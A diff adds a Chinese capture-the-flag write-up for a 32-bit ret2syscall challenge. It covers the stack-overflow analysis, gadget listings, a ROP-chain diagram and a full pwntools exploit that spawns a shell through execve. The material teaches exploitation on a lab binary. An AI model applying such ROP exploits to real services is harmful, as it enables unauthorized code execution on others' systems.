@@ -355,3 +355,223 @@ r.interactive()
 4. **64位 syscall 传参**：`rax=调用号` → `rdi/rsi/rdx` = 三个参数 → `syscall` 触发
 5. **针对静态链接无 libc 的题**：直接拼 syscall ROP 链，不依赖程序中是否有 `system` 函数
 
+---
+
+
+
+## [LitCTF 2026]  lit_ret2syscall32
+
+::alert{type="info" title="题目地址"}
+https://platform.cyclens.tech/#/challenge/95
+::
+
+### 0x01 基本信息
+
+checksec查看信息
+
+```bash
+    Arch:       i386-32-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+```
+
+程序执行
+
+![image-20260615091310427](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104505200-2114503495.png)
+
+---
+
+IDA pro查看代码
+
+#### main()
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  vuln();
+  puts("Goodbye!");
+  return 0;
+}
+```
+
+#### vuln()
+
+```c
+void vuln()
+{
+  char buf[64]; // [esp+0h] [ebp-48h] BYREF
+
+  puts("Welcome to the 32-bit Time Machine!");
+  puts("No system(), no /bin/sh... but int 0x80 still works.");
+  printf("Input: ");
+  read(0, buf, 0x200u);//这里就有栈溢出了
+}
+```
+
+出现了这些可疑的东西
+
+![image-20260615090637200](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104503969-1302820985.png)
+
+shift+F12观察字符串信息也没发现什么有用的信息，但是题目说了有int 0x80，那说明这题是syscall
+
+---
+
+### 0x02 漏洞分析
+
+```lua
+main->vuln->read()栈溢出
+```
+
+#### 栈溢出
+
+vuln非法读取超过数组的大小
+
+溢出偏移 = `0x48 (buf + padding) + 4 (saved ebp)` = **0x4C = 76 字节**
+
+![image-20260615091458118](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104503237-1708629262.png)
+
+---
+
+### 0x03 攻击思路
+
+这题是32位的syscall，那其实我们就是需要将几个特定的寄存器设定指定参数就行。
+
+32位函数调用约定如下
+
+| **架构**       | **系统调用号存放** | **Arg 1 (字符串指针)** | **Arg 2** | **Arg 3** | **触发指令** | **execve 系统调用号** |
+| -------------- | ------------------ | ---------------------- | --------- | --------- | ------------ | --------------------- |
+| **32位 (x86)** | `eax`              | `ebx`                  | `ecx`     | `edx`     | `int 0x80`   | `11` (`0xb`)          |
+
+那就是需要寻找这些寄存器并设置这些参数
+pop eax ->填充int 0x80
+pop ebx -> /bin/sh
+pop ecx -> 0
+pop edx -> 0
+
+其实程序提示了gadget链
+
+![image-20260615092440632](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104502406-1786067475.png)
+
+move_edx_eax是传输参数用的，也就是将我们构造的`/bin/sh`塞入edx寄存器中
+
+用ROPgadget找出我们要的传参寄存器
+
+```bash
+ROPgadget --binary ./ret2syscall32 --only "pop|ret|int|mov"
+```
+
+```asm
+0x080491a6 : pop eax ; ret
+0x08049022 : pop ebx ; ret
+0x080491b0 : pop ecx ; pop ebx ; ret
+0x080491b6 : pop edx ; ret
+0x080491bb : mov dword ptr [edx], eax ; ret
+0x080491c1 : int 0x80
+```
+
+
+
+这是我开发的一个小小的脚本，脚本源码已经开源到博客HACKED制作的小工具博客文章
+
+![image-20260615102755173](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104501067-2076230701.png)
+
+---
+
+
+
+### 0x04 payload构造
+
+#### 写入思路
+
+利用`mov [edx], eax ; ret`将四个字节写入内存中
+
+```asm
+写入 "/bin" → data_buf + 0
+写入 "/sh\0" → data_buf + 4
+```
+
+字符串的小端序表示：
+
+- `"/bin"` = `0x6e69622f`
+- `"/sh\0"` = `0x0068732f`
+
+----
+
+#### 完整ROP Chain
+
+```asm
+                    ┌─────────────────────────────┐
+                    │  填充: 0x48 + 4 = 76 字节    │
+                    ├─────────────────────────────┤
+                    │                             │
+  第一阶段: 写入      │  pop eax; ret               │
+  "/bin" → .bss     │  0x6e69622f                 │
+                    │  pop edx; ret               │
+                    │  data_buf                   │
+                    │  mov [edx], eax; ret        │
+                    │                             │
+  第二阶段: 写入      │  pop eax; ret               │
+  "/sh\0" → .bss+4  │  0x0068732f                 │
+                    │  pop edx; ret               │
+                    │  data_buf + 4               │
+                    │  mov [edx], eax; ret        │
+                    │                             │
+  第三阶段:          │  pop eax; ret               │
+  execve 调用        | 0x0b                       |
+                    │  pop ecx; pop ebx; ret      │
+                    │  0x00000000                 │
+                    │  data_buf (→ ebx="/bin/sh") │
+                    │  pop edx; ret               │
+                    │  0x00000000                 │
+                    │  int 0x80                   │
+                    └─────────────────────────────┘
+```
+
+### 0x05 EXP
+
+```python
+from pwn import *
+context(os='linux', arch='i386')
+
+r = process('./ret2syscall32')
+# r = remote('challenge.cyclens.tech', 30577)
+
+# ── Gadget 地址 ──
+pop_eax     = 0x080491a6   # pop eax ; ret
+pop_ecx_ebx = 0x080491b0   # pop ecx ; pop ebx ; ret
+pop_edx     = 0x080491b6   # pop edx ; ret
+mov_edx_eax = 0x080491bb   # mov [edx], eax ; ret
+int_0x80    = 0x080491c1   # int 0x80
+
+# ── .bss 可写地址 ──
+data_buf    = 0x0804b3a0
+
+# ── 溢出填充 ──
+offset = 0x48 + 4          # buf[0x48] + saved_ebp
+payload = b'A' * offset
+
+# ── 写入 "/bin/sh\0" 到 data_buf ──
+# 写 "/bin"
+payload += p32(pop_eax) + p32(0x6e69622f)
+payload += p32(pop_edx) + p32(data_buf)
+payload += p32(mov_edx_eax)
+
+# 写 "/sh\0"
+payload += p32(pop_eax) + p32(0x0068732f)
+payload += p32(pop_edx) + p32(data_buf + 4)
+payload += p32(mov_edx_eax)
+
+# ── execve("/bin/sh", 0, 0) ──
+payload += p32(pop_eax) + p32(0xb)        # eax = 11 (execve)
+payload += p32(pop_ecx_ebx) + p32(0) + p32(data_buf)  # ecx=0, ebx="/bin/sh"
+payload += p32(pop_edx) + p32(0)          # edx = 0
+payload += p32(int_0x80)                  # 触发系统调用
+
+r.sendline(payload)
+r.interactive()
+```
